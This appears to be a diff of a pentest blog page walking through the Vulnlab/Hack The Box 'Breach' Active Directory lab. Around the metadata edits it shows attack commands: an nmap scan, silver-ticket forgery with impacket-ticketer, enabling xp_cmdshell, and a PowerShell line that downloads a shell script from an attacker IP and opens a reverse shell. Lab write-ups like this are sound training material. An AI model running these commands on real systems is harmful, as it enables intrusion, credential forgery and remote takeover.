@@ -6,27 +6,28 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket AttacksIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Breach” domain enviro">
+    <meta name="description" content="Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket AttacksIn this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VL-Breach">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/03/18/VL-Breach/index.html">
+<meta property="og:url" content="http://example.com/2025/03/18/VL-Breach/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
-<meta property="og:description" content="Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket AttacksIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Breach” domain enviro">
+<meta property="og:description" content="Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket AttacksIn this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetr">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/shares.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/pot-users.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/julia-wong.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/localfile.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/sql-serv-hash.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/shell.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/impersonate.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Breach/admin.png">
-<meta property="article:published_time" content="2025-03-18T13:45:51.000Z">
-<meta property="article:modified_time" content="2025-05-23T10:40:08.604Z">
+<meta property="og:image" content="http://example.com/images/Breach/shares.png">
+<meta property="og:image" content="http://example.com/images/Breach/pot-users.png">
+<meta property="og:image" content="http://example.com/images/Breach/julia-wong.png">
+<meta property="og:image" content="http://example.com/images/Breach/localfile.png">
+<meta property="og:image" content="http://example.com/images/Breach/sql-serv-hash.png">
+<meta property="og:image" content="http://example.com/images/Breach/shell.png">
+<meta property="og:image" content="http://example.com/images/Breach/impersonate.png">
+<meta property="og:image" content="http://example.com/images/Breach/admin.png">
+<meta property="article:published_time" content="2025-03-18T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:35:26.515Z">
 <meta property="article:author" content="Panosoiko">
-<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Breach/shares.png">
+<meta name="twitter:image" content="http://example.com/images/Breach/shares.png">
     
     
       
@@ -36,12 +37,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -73,7 +74,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -93,7 +94,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -106,7 +107,7 @@
         <li><a class="icon" aria-label="Previous post" href="/2025/03/28/VL-Hybrid/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/03/16/VL-Baby2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2025/03/15/VL-Baby2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -119,24 +120,24 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/18/VL-Breach/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&text=VL-Breach"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&is_video=false&description=VL-Breach"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Breach&body=Check out this article: https://panosoikogr.github.io/2025/03/18/VL-Breach/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&name=VL-Breach&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/18/VL-Breach/&t=VL-Breach"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/18/VL-Breach/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/18/VL-Breach/&text=VL-Breach"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/18/VL-Breach/&is_video=false&description=VL-Breach"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Breach&body=Check out this article: http://example.com/2025/03/18/VL-Breach/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/18/VL-Breach/&name=VL-Breach&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/18/VL-Breach/&t=VL-Breach"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP-Scan-Results"><span class="toc-number">1.1.1.</span> <span class="toc-text">NMAP Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Access"><span class="toc-number">1.2.</span> <span class="toc-text">User Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Enumerating Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.2.2.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Julia-Wong%E2%80%99s-Files"><span class="toc-number">1.2.3.</span> <span class="toc-text">Accessing Julia Wong’s Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">BloodHound Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-Access"><span class="toc-number">1.3.3.</span> <span class="toc-text">MSSQL Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket-Attack"><span class="toc-number">1.3.4.</span> <span class="toc-text">Silver Ticket Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.3.5.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP-Scan-Results"><span class="toc-number">1.1.1.</span> <span class="toc-text">NMAP Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Access"><span class="toc-number">1.2.</span> <span class="toc-text">User Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Enumerating Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.2.2.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Julia-Wong%E2%80%99s-Files"><span class="toc-number">1.2.3.</span> <span class="toc-text">Accessing Julia Wong’s Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">BloodHound Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-Access"><span class="toc-number">1.3.3.</span> <span class="toc-text">MSSQL Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket-Attack"><span class="toc-number">1.3.4.</span> <span class="toc-text">Silver Ticket Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.3.5.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -161,7 +162,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-03-18T13:45:51.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        <time datetime="2025-03-18T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
         
       
     </div>
@@ -172,7 +173,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
     </div>
 
 
@@ -181,7 +182,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Vulnlab-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><a href="#Vulnlab-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks" class="headerlink" title="Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks"></a>Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</h1><p>In this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Breach” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and NTLM hash capture through social engineering, we’ll progress through Kerberoasting attacks against service accounts, silver ticket generation for privilege escalation, and ultimately achieve SYSTEM-level access via MSSQL exploitation and token impersonation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, NTLM theft techniques, Kerberos service account exploitation, silver ticket forgery, and leveraging impersonation privileges for escalation. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p>
+    <h1 id="Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><a href="#Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks" class="headerlink" title="Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks"></a>Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Breach” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and NTLM hash capture through social engineering, we’ll progress through Kerberoasting attacks against service accounts, silver ticket generation for privilege escalation, and ultimately achieve SYSTEM-level access via MSSQL exploitation and token impersonation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, NTLM theft techniques, Kerberos service account exploitation, silver ticket forgery, and leveraging impersonation privileges for escalation. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p>
 <h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="NMAP-Scan-Results"><a href="#NMAP-Scan-Results" class="headerlink" title="NMAP Scan Results"></a>NMAP Scan Results</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-17 15:22:18Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.10.109.252:1433: </span><br><span class="line">|     Target_Name: BREACH</span><br><span class="line">|     NetBIOS_Domain_Name: BREACH</span><br><span class="line">|     NetBIOS_Computer_Name: BREACHDC</span><br><span class="line">|     DNS_Domain_Name: breach.vl</span><br><span class="line">|     DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class="line">|     DNS_Tree_Name: breach.vl</span><br><span class="line">|_    Product_Version: 10.0.20348</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-17T15:22:26</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -1h59m59s, deviation: 0s, median: -1h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure>
 
 <h2 id="User-Access"><a href="#User-Access" class="headerlink" title="User Access"></a>User Access</h2><h3 id="Enumerating-Shares"><a href="#Enumerating-Shares" class="headerlink" title="Enumerating Shares"></a>Enumerating Shares</h3><p>First, let’s check for available SMB shares using the guest account:</p>
@@ -227,15 +228,21 @@
 <li><p>First, we converted the service account password to an NT hash using an online tool: <a target="_blank" rel="noopener" href="https://www.browserling.com/tools/ntlm-hash">https://www.browserling.com/tools/ntlm-hash</a></p>
 </li>
 <li><p>Next, we needed the domain SID:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py &#x27;breach.vl/svc_mssql@10.10.126.89&#x27; 0</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domain SID is: S-1-5-21-2330692793-3312915120-706255856</span><br></pre></td></tr></table></figure></li>
-<li><p>We created the Silver Ticket using ticketer:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ticketer -nthash &lt;&gt; -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip breachdc -spn MSSQLSvc/breachdc.breach.vl:1433 administrator</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure></li>
-<li><p>We used the Silver Ticket to connect to MSSQL as administrator:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -k breachdc.breach.vl</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure></li>
+</li>
 </ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py &#x27;breach.vl/svc_mssql@10.10.126.89&#x27; 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domain SID is: S-1-5-21-2330692793-3312915120-706255856</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>We created the Silver Ticket using ticketer:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ticketer -nthash &lt;&gt; -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip breachdc -spn MSSQLSvc/breachdc.breach.vl:1433 administrator</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>We used the Silver Ticket to connect to MSSQL as administrator:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -k breachdc.breach.vl</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+
 <h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h3><p>Our initial attempt to get a reverse shell was flagged as malicious:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;powershell -ep bypass -nop -w hidden -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.8.5.195:8080/Invoke-ConPtyShell.ps1&#x27;&#x27;); Invoke-ConPtyShell 10.8.5.195 3001&quot;&#x27;;</span><br></pre></td></tr></table></figure>
 <p>We found an alternative payload that worked:</p>
@@ -268,7 +275,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -278,23 +285,23 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP-Scan-Results"><span class="toc-number">1.1.1.</span> <span class="toc-text">NMAP Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Access"><span class="toc-number">1.2.</span> <span class="toc-text">User Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Enumerating Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.2.2.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Julia-Wong%E2%80%99s-Files"><span class="toc-number">1.2.3.</span> <span class="toc-text">Accessing Julia Wong’s Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">BloodHound Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-Access"><span class="toc-number">1.3.3.</span> <span class="toc-text">MSSQL Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket-Attack"><span class="toc-number">1.3.4.</span> <span class="toc-text">Silver Ticket Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.3.5.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Hack-The-Box-Breach-Complete-Active-Directory-Compromise-Through-NTLM-Relay-and-Silver-Ticket-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab - Hack The Box Breach: Complete Active Directory Compromise Through NTLM Relay and Silver Ticket Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP-Scan-Results"><span class="toc-number">1.1.1.</span> <span class="toc-text">NMAP Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Access"><span class="toc-number">1.2.</span> <span class="toc-text">User Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Enumerating Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.2.2.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a 